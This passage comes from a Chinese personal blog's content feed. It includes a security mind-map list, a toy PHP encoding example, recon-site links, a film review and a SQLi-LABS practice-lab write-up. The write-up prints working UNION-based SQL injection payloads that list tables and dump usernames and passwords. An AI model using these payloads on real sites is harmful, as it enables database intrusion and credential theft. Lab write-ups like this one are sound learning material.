 ├── 无线电.jpg</span><br><span class="line">    │   └── 无线安全.jpg</span><br><span class="line">    ├── 时间管理</span><br><span class="line">    │   └── 个人知识管理工具软件.jpg</span><br><span class="line">    ├── 移动安全</span><br><span class="line">    │   ├── Android软件安全工程师技能表.png</span><br><span class="line">    │   ├── andrioid-security.png</span><br><span class="line">    │   ├── android_windows_malware.png</span><br><span class="line">    │   ├── android_windows_恶意病毒发展史.png</span><br><span class="line">    │   ├── apk攻防.png</span><br><span class="line">    │   ├── iOS应用审计系统.png</span><br><span class="line">    │   ├── iOS软件安全工程师技能表.png</span><br><span class="line">    │   ├── macOS软件安全工程师技能表.png</span><br><span class="line">    │   └── 移动App漏洞检测平台.png</span><br><span class="line">    ├── 等级保护</span><br><span class="line">    │   └── 等保内容.jpg</span><br><span class="line">    ├── 编程技术</span><br><span class="line">    │   ├── ThoughtWorks 开发者读书路线图.jpg</span><br><span class="line">    │   ├── wyscan.png</span><br><span class="line">    │   └── 数据库.jpg</span><br><span class="line">    ├── 运维安全</span><br><span class="line">    │   ├── DDOS.jpg</span><br><span class="line">    │   ├── DDoS攻击及对策.jpg</span><br><span class="line">    │   ├── Linux检查脚本.jpeg</span><br><span class="line">    │   ├── SAE运维体系.jpg</span><br><span class="line">    │   ├── SIEM系统的结构图.jpg</span><br><span class="line">    │   ├── SSL_Threat_Model.png</span><br><span class="line">    │   ├── TCP:IP参考模型的安全协议分层.jpg</span><br><span class="line">    │   ├── TCP:IP参考模型的安全服务与安全机制.jpg</span><br><span class="line">    │   ├── WPDRRC模型.jpg</span><br><span class="line">    │   ├── 运维.jpg</span><br><span class="line">    │   ├── 业务运维.jpg</span><br><span class="line">    │   ├── 信息安全.jpg</span><br><span class="line">    │   ├── 安全事件.jpg</span><br><span class="line">    │   ├── 运维安全.png</span><br><span class="line">    │   ├── 数据库安全.jpg</span><br><span class="line">    │   ├── 安全管理制度.jpg</span><br><span class="line">    │   ├── 密码安全研究.jpg</span><br><span class="line">    │   ├── 安全工作要点v0.2.jpeg</span><br><span class="line">    │   ├── 运维职业技术点.jpg</span><br><span class="line">    │   ├── 安全加固服务流程.jpg</span><br><span class="line">    │   ├── 常见电信诈骗分类.jpg</span><br><span class="line">    │   ├── 网络与基础架构图.jpg</span><br><span class="line">    │   ├── 层次化网络设计案例.jpg</span><br><span class="line">    │   ├── 口令破解与防御技术.png</span><br><span class="line">    │   ├── 企业内网准入控制规划.jpg</span><br><span class="line">    │   ├── 信息安全分层逻辑模型.jpg</span><br><span class="line">    │   ├── 密码找回逻辑漏洞总结.png</span><br><span class="line">    │   ├── 微软深度防御安全模型7层安全防御.jpg</span><br><span class="line">    │   ├── 非涉密信息系统等级保护.jpg</span><br><span class="line">    │   ├── 互联网企业安全建设思路.png</span><br><span class="line">    │   ├── 拒绝服务攻击与防御技术.png</span><br><span class="line">    │   ├── 人民银行“三三二一”总体技术框架.jpg</span><br><span class="line">    │   └── 信息系统等级保护实施指南思维导图.jpg</span><br><span class="line">    ├── 逆向漏洞</span><br><span class="line">    │   ├── A-Study-of-RATs.jpg</span><br><span class="line">    │   ├── MPDRR模型.jpg</span><br><span class="line">    │   ├── Vulnerability-Exploit-Fuzz-Mitigation-v1.3.jpeg</span><br><span class="line">    │   ├── Vulnerability-Exploit-Fuzz-Mitigation-v1.4.mmap</span><br><span class="line">    │   ├── Windows_Hacker学习路线图.jpg</span><br><span class="line">    │   ├── arm-asm-cheatsheetv.png</span><br><span class="line">    │   ├── cheat sheet reverse v5.png</span><br><span class="line">    │   ├── 计算机病毒.png</span><br><span class="line">    │   ├── 安全人员技术要求.jpg</span><br><span class="line">    │   ├── 木马攻击与防御技术.png</span><br><span class="line">    │   ├── 欺骗攻击与防御技术.png</span><br><span class="line">    │   ├── 入门二进制漏洞分析脑图.png</span><br><span class="line">    │   └── 缓冲区溢出攻击与防御技术.png</span><br><span class="line">    ├── 风控安全</span><br><span class="line">    │   ├── P2P安全.png</span><br><span class="line">    │   ├── componement.png</span><br><span class="line">    │   ├── system.png</span><br><span class="line">    │   └── 风控.png</span><br><span class="line">    ├── 区块链安全</span><br><span class="line">    │   ├── Hash算法与摘要.png</span><br><span class="line">    │   ├── WechatIMG5034.jpeg</span><br><span class="line">    │   ├── WechatIMG5039.jpeg</span><br><span class="line">    │   ├── blockchain.png</span><br><span class="line">    │   ├── 加解密算法.png</span><br><span class="line">    │   ├── 区块链生态圈.jpeg</span><br><span class="line">    │   └── 区块链技术指南—密码学与安全技术.png</span><br><span class="line">    └── 物联网安全</span><br><span class="line">        ├── CSA物联网安全指南.png</span><br><span class="line">        ├── 物联网安全--梆梆安全.png</span><br><span class="line">        ├── 智能硬件安全.png</span><br><span class="line">        ├── 物联网安全系列-绿盟.png</span><br><span class="line">        ├── 物联网安全综述-绿盟.png</span><br><span class="line">        ├── 物联网和互联网对比-绿盟.png</span><br><span class="line">        ├── 物联网与互联网对比.png</span><br><span class="line">        └── 物联网设备安全分析.png</span><br><span class="line">      </span><br></pre></td></tr></table></figure><p>{hide}<br>{cloud title&#x3D;”安全思维导图集合” type&#x3D;”github” url&#x3D;”<a href="https://github.com/SecWiki/sec-chart">https://github.com/SecWiki/sec-chart</a>“ password&#x3D;””&#x2F;}<br>{&#x2F;hide}</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>加密算法</title>
      <link href="/2023/08/31/Day06%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/"/>
      <url>/2023/08/31/Day06%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h3 id="6-1常见加密编码等算法解析"><a href="#6-1常见加密编码等算法解析" class="headerlink" title="6.1常见加密编码等算法解析"></a>6.1常见加密编码等算法解析</h3><ul><li>MD5，SHA, ASC,进制，时间戳，URL, BASE64, Unescape, AES, DES等</li></ul><h3 id="6-2常见加密形式算法解析"><a href="#6-2常见加密形式算法解析" class="headerlink" title="6.2常见加密形式算法解析"></a>6.2常见加密形式算法解析</h3><ul><li>直接加密,带salt, 带密码，带偏移，带位数,带模式，带干扰，自定义组合等</li></ul><h3 id="6-3常见解密方式"><a href="#6-3常见解密方式" class="headerlink" title="6.3常见解密方式"></a>6.3常见解密方式</h3><ul><li>枚举,自定义逆向算法，可逆向</li></ul><h3 id="6-4了解常规加密算法的特性"><a href="#6-4了解常规加密算法的特性" class="headerlink" title="6.4了解常规加密算法的特性"></a>6.4了解常规加密算法的特性</h3><ul><li>长度位数,字符规律,代码分析,搜索获取等</li></ul><h3 id="6-5工具"><a href="#6-5工具" class="headerlink" title="6.5工具"></a>6.5工具</h3><p>{cloud title&#x3D;”” type&#x3D;”bd” url&#x3D;”<a href="https://pan.baidu.com/s/1A5Jjc-spYBKlKiPNbaetbQ">https://pan.baidu.com/s/1A5Jjc-spYBKlKiPNbaetbQ</a> “ password&#x3D;”8eh7 “&#x2F;}<br> <a href="http://tool.chacuo.net/cryptaes">在线AES加密解密</a><br>自定义加密算法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span>(<span class="params"><span class="variable">$data</span>, <span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="title function_ invoke__">md5</span>(<span class="string">&#x27;ISCC&#x27;</span>);</span><br><span class="line">    <span class="comment">#print $key;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">自定义解密算法</span><br><span class="line"></span><br><span class="line">    <span class="variable">$x</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="variable">$len</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$data</span>);</span><br><span class="line">    <span class="variable">$klen</span> = <span class="title function_ invoke__">strlen</span> (<span class="variable">$key</span>);</span><br><span class="line">    <span class="comment">#print $len;</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$x</span> == <span class="variable">$klen</span>)</span><br><span class="line">            <span class="variable">$x</span> = <span class="number">0</span> ;</span><br><span class="line">        <span class="variable">$char</span> .= <span class="variable">$key</span>[<span class="variable">$x</span>];</span><br><span class="line">        <span class="variable">$x</span> += <span class="number">1</span>;</span><br><span class="line">        <span class="comment">#print $key[$X];</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">#print $char[0].$char[1].$char[2];</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="variable">$len</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="variable">$str</span> .= <span class="title function_ invoke__">chr</span> ((<span class="title function_ invoke__">ord</span> (<span class="variable">$data</span>[<span class="variable">$i</span>]) + <span class="title function_ invoke__">ord</span> (<span class="variable">$char</span>[<span class="variable">$i</span>]))%<span class="number">128</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">base64_encode</span> (<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">encrypt</span>(<span class="string">&#x27;helloword&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>自定义解密算法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decrypt</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$mkey</span> = <span class="title function_ invoke__">md5</span>(<span class="string">&#x27;ISCC&#x27;</span>);</span><br><span class="line">    <span class="variable">$klen</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$mkey</span>);</span><br><span class="line">    <span class="variable">$tmp</span> = <span class="variable">$str</span>;</span><br><span class="line">    <span class="variable">$tmp</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$tmp</span>);         <span class="comment">//解密base64</span></span><br><span class="line">    <span class="variable">$md_len</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$tmp</span>);            <span class="comment">//获取输入加密字符长度</span></span><br><span class="line">    <span class="variable">$x</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="variable">$char</span> = <span class="string">&quot;&quot;</span>;                         <span class="comment">//临时数组</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="variable">$md_len</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$x</span> == <span class="variable">$klen</span>)&#123;               <span class="comment">//当加密字符串长度超出key</span></span><br><span class="line">             <span class="variable">$x</span> = <span class="number">0</span>;                    <span class="comment">//的长度时查重头开始和获取    </span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$char</span> .= <span class="variable">$mkey</span>[<span class="variable">$x</span>];             <span class="comment">//.= 累积函数</span></span><br><span class="line">        <span class="variable">$x</span> += <span class="number">1</span>;</span><br><span class="line">    &#125;    </span><br><span class="line"></span><br><span class="line">    <span class="variable">$md_data</span> = <span class="keyword">array</span>();                 <span class="comment">//获取加密字符中的ASCII数据</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="variable">$md_len</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_push</span>(<span class="variable">$md_data</span>,<span class="title function_ invoke__">ord</span>(<span class="variable">$tmp</span>[<span class="variable">$i</span>]));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$md_data_source</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="variable">$data1</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="variable">$data2</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$md_data</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;<span class="comment">//最终还原</span></span><br><span class="line">        <span class="variable">$i</span> = <span class="variable">$key</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$i</span> &gt;= <span class="title function_ invoke__">strlen</span>(<span class="variable">$mkey</span>))&#123;</span><br><span class="line">            <span class="variable">$i</span> = <span class="variable">$i</span> - <span class="title function_ invoke__">strlen</span>(<span class="variable">$mkey</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$dd</span> = <span class="variable">$value</span>;</span><br><span class="line">        <span class="variable">$od</span> = <span class="title function_ invoke__">ord</span>(<span class="variable">$mkey</span>[<span class="variable">$i</span>]);</span><br><span class="line">        <span class="title function_ invoke__">array_push</span>(<span class="variable">$md_data_source</span>,<span class="variable">$dd</span>);</span><br><span class="line">        <span class="variable">$data1</span> .=<span class="title function_ invoke__">chr</span>((<span class="variable">$dd</span>+<span class="number">128</span>)-<span class="variable">$od</span>);        <span class="comment">//原数据加key的Ascii大于128</span></span><br><span class="line"><span class="variable">$data2</span> .=<span class="title function_ invoke__">chr</span>(<span class="variable">$dd</span>-<span class="variable">$od</span>);              <span class="comment">//原数据加key的Ascii小于128</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;data1 =&gt;&quot;</span>.<span class="variable">$data1</span>.<span class="string">&quot;&lt;br&gt;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;data2 =&gt;&quot;</span>.<span class="variable">$data2</span>.<span class="string">&quot;&lt;br&gt;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;HxclIiEqIiUY&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">decrypt</span>(<span class="variable">$str</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>信息收集</title>
      <link href="/2023/08/31/Day09--%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
      <url>/2023/08/31/Day09--%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<h4 id="App信息收集"><a href="#App信息收集" class="headerlink" title="App信息收集"></a>App信息收集</h4><hr><h2 id="在安全测试中，若WEB无法取得进展或无WEB的情况下，我们需要借助APP或其他资产在进行信息收集-从而开展后续渗透-APP-提取一键反编译提取"><a href="#在安全测试中，若WEB无法取得进展或无WEB的情况下，我们需要借助APP或其他资产在进行信息收集-从而开展后续渗透-APP-提取一键反编译提取" class="headerlink" title="在安全测试中，若WEB无法取得进展或无WEB的情况下，我们需要借助APP或其他资产在进行信息收集,从而开展后续渗透#APP 提取一键反编译提取 "></a>在安全测试中，若WEB无法取得进展或无WEB的情况下，我们需要借助APP或其他资产在进行信息收集,从而开展后续渗透<br>#APP 提取一键反编译提取 </h2><p> 如： <a href="https://github.com/TheKingOfDuck/ApkAnalyser">漏了个大洞</a> </p><p>#APP 抓数据包进行工具配合 </p><ul><li>使用burp suite设置代理，或者wireshark抓数据包，进行分析</li></ul><p>#各种第三方应用相关探针技术</p><ul><li><a href="https://www.shodan.io/">https://www.shodan.io/</a> </li><li><a href="https://fofa.so/">https://fofa.so/</a></li></ul><p>#各种服务接口信息相关探针技术 </p><p>涉及资源：<br><a href="https://fofa.so/">https://fofa.so/</a><br><a href="http://tool.chinaz.com/">http://tool.chinaz.com</a><br><a href="https://www.shodan.io/">https://www.shodan.io/</a><br><a href="https://www.zoomeye.org/">https://www.zoomeye.org/</a><br><a href="https://nmap.org/download.html">https://nmap.org/download.html</a> </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>落叶归根</title>
      <link href="/2023/08/30/%E8%90%BD%E5%8F%B6%E5%BD%92%E6%A0%B9/"/>
      <url>/2023/08/30/%E8%90%BD%E5%8F%B6%E5%BD%92%E6%A0%B9/</url>
      
        <content type="html"><![CDATA[<p>据说这个电影是根据真实事件改编的 <a href="http://news.sina.com.cn/s/2005-01-04/02314704948s.shtml">原型</a></p><iframe src="//player.bilibili.com/player.html?aid=510990317&bvid=BV1ku411k7Kh&cid=583932847&page=1" scrolling="no" border="0" frameborder="no"  height="500" width ="700"  framespacing="0" allowfullscreen="true"> </iframe><p>《落叶归根》展示了社会的人生百态，是刻意的情节，却意味深长。劫匪之“仗义”；司机之“爱情”；寂寞老人之“死亡”；旅行者之“坚持”；养蜂人之“亲情”；发廊女之“信任”；民工之“互助”；宋丹丹之“母爱”；老警察之“理解”。这些都是我们每一个人生命中的关键词，如何对待这些关键词，决定着是幸福还是不幸。</p><p>在知乎上看到了一个不戳的影评<a href="https://zhuanlan.zhihu.com/p/390090863">《落叶归根》生活也许一地鸡毛，倾尽全力还是一无所有，但还是要活着，要乐观、坚强地活着。 (zhihu.com)</a></p><p>电影中还是有很多画面难以释怀</p><p><img src="https://cdn.jsdelivr.net/gh/lovescxs/image-store@master/202310031730241.png" alt="3e7tYCKq5nsf9mv"></p><p>歹徒认仗义，但乘客们是不会认的，因为仗义比不上钱，也比不上项链和手表，相反，仗义会让你因为他们不想和死人待在一起而被赶下公交车。其实，我们大多数人就是车上的这些乘客，在罪与恶面前沉默的大多数，在生活中精致的利己主义者，我们批判和瞧不上的那些人或许就是我们自己。</p><p>还有很多很多</p><p><img src="https://cdn.jsdelivr.net/gh/lovescxs/image-store@master/202310031731008.png" alt="image-20230811212350418"></p><p>有一幕是这样的：老赵终于绝望，准备挖坑把那位兄弟埋骨他乡，坑挖好后，他先躺进去试试，这时他发现，经过许多天的长途跋涉，历尽磨难，经历了形形色色的好人坏人后，原来对于他来讲这个世界上最温馨宁静最舒坦的地方就是在春风里，在柳树下，绿色原野里这个长方形的墓穴。他舒坦的闭上眼镜带着疲惫睡着了，醒来时眼角滑下两滴真实的泪水，为边这个倒霉的死鬼朋友，也为自己</p><p>老赵想搭车，抬头一看是接送孩子们的校车，他摆摆手，“走吧”，和孩子们笑着招手。</p><p><img src="https://s2.loli.net/2023/08/11/cXDFN6gHs1er2lB.webp" alt="img"></p><p>两边的人们沉默地好奇地注视着或是侧视着他，而之前那辆校车上的孩子喊了一声“叔叔”，然后递给了他一瓶水，前面是塌方，他无动于衷，继续走，直到，筋疲力尽，倒下。</p><p><img src="https://cdn.jsdelivr.net/gh/lovescxs/image-store@master/202310031730741.png" alt="image-20230811212528827"></p><p>落叶是归了，可是根已经不再了</p><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=433107509&auto=1&height=66"></iframe>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SQLi-LABS靶场wp</title>
      <link href="/2023/08/30/sqlilabs%E9%9D%B6%E5%9C%BA/"/>
      <url>/2023/08/30/sqlilabs%E9%9D%B6%E5%9C%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="1-less-1-2023年8月2日"><a href="#1-less-1-2023年8月2日" class="headerlink" title="1.less-1  2023年8月2日"></a>1.less-1  2023年8月2日</h1><h5 id="1-1找注入点"><a href="#1-1找注入点" class="headerlink" title="1.1找注入点"></a>1.1找注入点</h5><p>让我们输入id，</p><p>提示输入数字值的ID作为参数，我们输入?id&#x3D;1</p><h5 id="1-2界面判断"><a href="#1-2界面判断" class="headerlink" title="1.2界面判断"></a>1.2界面判断</h5><p>通过数字值不同返回的内容也不同，所以我们输入的内容是带入到数据库里面查询了</p><h5 id="1-3-报错，判断是字符型还是数字型"><a href="#1-3-报错，判断是字符型还是数字型" class="headerlink" title="1.3 报错，判断是字符型还是数字型"></a>1.3 报错，判断是字符型还是数字型</h5><p>根据结果指定是字符型且存在sql注入漏洞</p><h5 id="1-4-联合注入"><a href="#1-4-联合注入" class="headerlink" title="1.4 联合注入"></a>1.4 联合注入</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;order by 3 --+</span><br></pre></td></tr></table></figure><p>很明显有3列</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,2,3--+</span><br></pre></td></tr></table></figure><p>说明数据在2，3列里面</p><p>获取当前数据名和版本号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,database(),version()--+</span><br></pre></td></tr></table></figure><p>information_schema.tables表示该数据库下的tables表，点表示下一级。where后面是条件，group_concat()是将查询到结果连接起来。如果不用group_concat查询到的只有user。该语句的意思是查询information_schema数据库下的tables表里面且table_schema字段内容是security的所有table_name的内容。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br></pre></td></tr></table></figure><h5 id="1-5爆字段名"><a href="#1-5爆字段名" class="headerlink" title="1.5爆字段名"></a>1.5爆字段名</h5><p>通过sql语句查询知道当前数据库有四个表，根据表名知道可能用户的账户和密码是在users表中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br></pre></td></tr></table></figure><p>该语句的意思是查询information_schema数据库下的columns表里面且table_users字段内容是users的所有column_name的内。<strong>注意table_name字段不是只存在于tables表，也是存在columns表中。表示所有字段对应的表名。</strong></p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(username ,id , password) from users--+</span><br></pre></td></tr></table></figure><p>注入成功！😊😊😊</p><h1 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a>less-2</h1><p>很明显和第一关差不多，让它报错看看</p><p>当我们输入单引号或者双引号可以看到报错，且报错信息看不到数字，所有我们可以猜测sql语句应该是数字型注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">order by 3</span><br><span class="line">?id=1 and 1=2 union select 1,2,3</span><br><span class="line">?id=1 and 1=2 union select 1,database(),version()</span><br><span class="line">?id=1 and 1=2 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;</span><br><span class="line">?id=1 and 1=2 union select 1,2,group_concat(username ,id , password) from users</span><br></pre></td></tr></table></figure><p>可以从2，3上爆出数据</p><p>很明显账号在users表中，那下面就很明显了</p><p>ok,搞定</p><p>8月2日</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>图片</title>
      <link href="/2023/08/30/img/"/>
      <url>/2023/08/30/img/</url>
      
        <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/lovescxs/image-store@master/202310031735609.webp" alt="rdwjj7-tuya"></p><p><img src="https://cdn.jsdelivr.net/gh/lovescxs/image-store@master/202310031735610.webp" alt="vg7lv3-tuya"></p><p><img src="https://cdn.jsdelivr.net/gh/lovescxs/image-store@master/202310031735611.webp" alt="wyv9qx-tuya"></p><p><img src="https://cdn.jsdelivr.net/gh/lovescxs/image-store@master/202310031735612.webp" alt="xlq1rv-tuya"></p><p><img src="https://cdn.jsdelivr.net/gh/lovescxs/image-store@master/202310031735613.webp" alt="y8vlyk-tuya"></p><p><img src="https://cdn.jsdelivr.net/gh/lovescxs/image-store@master/202310031735614.webp" alt="y8622k-tuya"></p><p><img src="https://cdn.jsdelivr.net/gh/lovescxs/image-store@master/202310031735615.webp" alt="ymz61d-tuya"></p><p><img src="https://cdn.jsdelivr.net/gh/lovescxs/image-store@master/202310031735616.webp" alt="z8dp1v-tuya"></p><p><img src="https://cdn.jsdelivr.net/gh/lovescxs/image-store@master/202310031735617.webp" alt="z8e8qy-tuya"></p><p><img src="https://cdn.jsdelivr.net/gh/lovescxs/image-store@master/202310031735618.webp" alt="z8mq8y-tuya"></p><p><img src="https://cdn.jsdelivr.net/gh/lovescxs/image-store@master/202310031735619.webp" alt="z8odwg-tuya"></p><p><img src="https://cdn.jsdelivr.net/gh/lovescxs/image-store@master/202310031735620.webp" alt="zyxvqy-tuya"></p><p><img src="https://cdn.jsdelivr.net/gh/lovescxs/image-store@master/202310031735621.webp" alt="0qo2r4-tuya"></p><p><img src="https://cdn.jsdelivr.net/gh/lovescxs/image-store@master/202310031735622.webp" alt="2em38y-tuya"></p><p><img src="https://cdn.jsdelivr.net/gh/lovescxs/image-store@master/202310031735623.webp" alt="5w26x1-tuya"></p><p><img src="https://cdn.jsdelivr.net/gh/lovescxs/image-store@master/202310031735624.webp" alt="6k3oox-tuya"></p><p><img src="https://cdn.jsdelivr.net/gh/lovescxs/image-store@master/202310031735625.webp" alt="6kpko7-tuya"></p><p><img src="https://cdn.jsdelivr.net/gh/lovescxs/image-store@master/202310031735626.webp" alt="6olw9x-tuya"></p><p><img src="https://cdn.jsdelivr.net/gh/lovescxs/image-store@master/202310031735627.webp" alt="6oqzgq-tuya"></p><p><img src="https://cdn.jsdelivr.net/gh/lovescxs/image-store@master/202310031735628.webp" alt="7pg1m9-tuya"></p><p><img src="https://cdn.jsdelivr.net/gh/lovescxs/image-store@master/202310031735629.webp" alt="8oev1j-tuya"></p><p><img src="https://cdn.jsdelivr.net/gh/lovescxs/image-store@master/202310031735630.webp" alt="8ogod1-tuya"></p><p><img src="https://cdn.jsdelivr.net/gh/lovescxs/image-store@master/202310031735631.webp" alt="9mxz8k-tuya"></p><p><img src="https://cdn.jsdelivr.net/gh/lovescxs/image-store@master/202310031735632.webp" alt="13mk9v-tuya"></p><p><img src="https://cdn.jsdelivr.net/gh/lovescxs/image-store@master/202310031735634.webp" alt="13pv13-tuya"></p><p><img src="https://cdn.jsdelivr.net/gh/lovescxs/image-store@master/202310031735635.webp" alt="13x79v-tuya"></p><p><img src="https://cdn.jsdelivr.net/gh/lovescxs/image-store@master/202310031735636.webp" alt="43vgyn-tuya"></p><p><img src="https://cdn.jsdelivr.net/gh/lovescxs/image-store@master/202310031735637.webp" alt="47z1vn-tuya"></p><p><img src="https://cdn.jsdelivr.net/gh/lovescxs/image-store@master/202310031735638.webp" alt="57o9j5-tuya"></p><p><img src="https://cdn.jsdelivr.net/gh/lovescxs/image-store@master/202310031735639.webp" alt="72rd8e-tuya"></p><p><img src="https://cdn.jsdelivr.net/gh/lovescxs/image-store@master/202310031735640.webp" alt="72rxqo-tuya"></p><p><img src="https://cdn.jsdelivr.net/gh/lovescxs/image-store@master/202310031735641.webp" alt="dgzj9o-tuya"></p><p><img src="https://cdn.jsdelivr.net/gh/lovescxs/image-store@master/202310031735642.webp" alt="dpr2mo-tuya"></p><p><img src="https://cdn.jsdelivr.net/gh/lovescxs/image-store@master/202310031735643.webp" alt="e7jj6r-tuya"></p><p><img src="https://cdn.jsdelivr.net/gh/lovescxs/image-store@master/202310031735644.webp" alt="e7kpl8-tuya"></p><p><img src="https://cdn.jsdelivr.net/gh/lovescxs/image-store@master/202310031735645.webp" alt="e7pwdw-tuya"></p><p><img src="https://cdn.jsdelivr.net/gh/lovescxs/image-store@master/202310031735646.webp" alt="eymye8-tuya"></p><p><img src="https://cdn.jsdelivr.net/gh/lovescxs/image-store@master/202310031735647.webp" alt="eymzjk-tuya"></p><p><img 